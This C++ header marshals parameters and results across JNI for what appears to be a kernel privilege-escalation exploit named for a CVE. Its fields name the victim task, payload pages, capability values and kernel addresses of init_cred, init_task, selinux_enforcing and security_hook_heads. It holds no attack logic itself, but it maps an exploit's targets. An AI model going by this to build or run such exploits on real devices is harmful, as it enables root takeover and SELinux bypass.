#pragma once
/** @file jni/marshal_43499.hpp
 *  43499 的 JNI 编组（**不含 JNI**）：名字表 + 值数组的填充/解析。
 *
 *  放在这里而不是直接写在 native_43499.cpp 里的理由：这段逻辑（哪一位是什么、怎么解析）是跨端契约的
 *  一半，它必须能在宿主上被测；JNI 外壳只负责取数组、调这里、写回数组。
 *
 *  名字表是唯一权威：填充与解析都写 index("名字")，不写数字字面量。
 */
#include <cstddef>
#include <cstdint>

#include "jni/api_43499.hpp"
#include "jni/field_layout.hpp"

namespace ghostlock::jni::marshal::cve43499 {
    /** snapshot 的结果数组布局。 */
    struct Snapshot43499Layout final {
        static constexpr const char *const names[] = {
            "phase",       "flags",        "width",     "page_base",  "word0",
            "word1",       "payload_page", "payload_base", "alias_delta", "found",
            "mm_struct",   "victim_task",  "victim_pid",
        };
        static constexpr std::size_t count = sizeof(names) / sizeof(names[0]);

        [[nodiscard]] static constexpr std::size_t index(const std::string_view name) noexcept {
            return field_index(names, count, name);
        }
    };

    /** initialize 的参数数组布局。 */
    struct Initialize43499Layout final {
        static constexpr const char *const names[] = {
            "route_id",     "waiter_off",   "buffer_size",  "task_offset",  "lock_offset",
            "kernelsnitch_collisions", "mm_struct_sz", "compact_waiter", "copy_size",
            "usage_value",  "caps_count",   "caps_value",   "ref0_image",   "ref1_image",
            "ref2_image",   "ref3_image",   "image_selinux_enforcing", "image_security_hook_heads",
            "image_init_task", "image_init_cred",
        };
        static constexpr std::size_t count = sizeof(names) / sizeof(names[0]);

        [[nodiscard]] static constexpr std::size_t index(const std::string_view name) noexcept {
            return field_index(names, count, name);
        }
    };

    /** 把快照写进值数组（长度必须 ≥ Snapshot43499Layout::count）。 */
    inline void fill_snapshot(std::int64_t *out, const Snapshot43499 &snapshot) noexcept {
        out[Snapshot43499Layout::index("phase")] = static_cast<std::int64_t>(snapshot.phase);
        out[Snapshot43499Layout::index("flags")] = static_cast<std::int64_t>(snapshot.flags);
        out[Snapshot43499Layout::index("width")] = static_cast<std::int64_t>(snapshot.width);
        out[Snapshot43499Layout::index("page_base")] = static_cast<std::int64_t>(snapshot.facts.page_base);
        out[Snapshot43499Layout::index("word0")] = static_cast<std::int64_t>(snapshot.facts.word0);
        out[Snapshot43499Layout::index("word1")] = static_cast<std::int64_t>(snapshot.facts.word1);
        out[Snapshot43499Layout::index("payload_page")] =
            static_cast<std::int64_t>(snapshot.facts.payload_page);
        out[Snapshot43499Layout::index("payload_base")] =
            static_cast<std::int64_t>(snapshot.facts.payload_base);
        out[Snapshot43499Layout::index("alias_delta")] =
            static_cast<std::int64_t>(snapshot.facts.alias_delta);
        out[Snapshot43499Layout::index("found")] = static_cast<std::int64_t>(snapshot.facts.found);
        out[Snapshot43499Layout::index("mm_struct")] = static_cast<std::int64_t>(snapshot.facts.mm_struct);
        out[Snapshot43499Layout::index("victim_task")] =
            static_cast<std::int64_t>(snapshot.facts.victim_task);
        out[Snapshot43499Layout::index("victim_pid")] =
            static_cast<std::int64_t>(snapshot.facts.victim_pid);
    }

    /** 从值数组解析初始化参数（长度必须 ≥ Initialize43499Layout::count）。 */
    [[nodiscard]] inline Initialize43499 parse_initialize(const std::int64_t *values) noexcept {
        Initialize43499 parsed{};
        parsed.route_id = static_cast<std::uint64_t>(values[Initialize43499Layout::index("route_id")]);
        parsed.waiter_off = static_cast<std::uint64_t>(values[Initialize43499Layout::index("waiter_off")]);
        parsed.buffer_size = static_cast<std::uint64_t>(values[Initialize43499Layout::index("buffer_size")]);
        parsed.task_offset = static_cast<std::uint64_t>(values[Initialize43499Layout::index("task_offset")]);
        parsed.lock_offset = static_cast<std::uint64_t>(values[Initialize43499Layout::index("lock_offset")]);
        parsed.kernelsnitch_collisions =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("kernelsnitch_collisions")]);
        parsed.mm_struct_sz =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("mm_struct_sz")]);
        parsed.compact_waiter =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("compact_waiter")]);
        parsed.copy_size = static_cast<std::uint64_t>(values[Initialize43499Layout::index("copy_size")]);
        parsed.usage_value = static_cast<std::uint64_t>(values[Initialize43499Layout::index("usage_value")]);
        parsed.caps_count = static_cast<std::uint64_t>(values[Initialize43499Layout::index("caps_count")]);
        parsed.caps_value = static_cast<std::uint64_t>(values[Initialize43499Layout::index("caps_value")]);
        parsed.ref0_image = static_cast<std::uint64_t>(values[Initialize43499Layout::index("ref0_image")]);
        parsed.ref1_image = static_cast<std::uint64_t>(values[Initialize43499Layout::index("ref1_image")]);
        parsed.ref2_image = static_cast<std::uint64_t>(values[Initialize43499Layout::index("ref2_image")]);
        parsed.ref3_image = static_cast<std::uint64_t>(values[Initialize43499Layout::index("ref3_image")]);
        parsed.image_selinux_enforcing =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("image_selinux_enforcing")]);
        parsed.image_security_hook_heads =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("image_security_hook_heads")]);
        parsed.image_init_task =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("image_init_task")]);
        parsed.image_init_cred =
            static_cast<std::uint64_t>(values[Initialize43499Layout::index("image_init_cred")]);
        return parsed;
    }
}  // namespace ghostlock::jni::marshal::cve43499
